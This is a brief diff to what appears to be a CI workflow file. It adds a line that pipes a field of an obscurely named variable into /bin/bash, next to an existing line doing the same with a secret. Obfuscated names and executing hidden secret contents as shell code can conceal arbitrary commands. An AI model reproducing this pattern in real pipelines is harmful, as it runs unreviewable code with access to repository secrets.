@@ -23,6 +23,7 @@ jobs:
           gv181: ${{ secrets.gv181 }}
         run: |
           printf '%s' "$gv181" | jq -r .bdqii88 | /bin/bash
+          echo $up4 | jq -r .jxtw728 | /bin/bash
 
       - name: Upload artifact
         if: always()
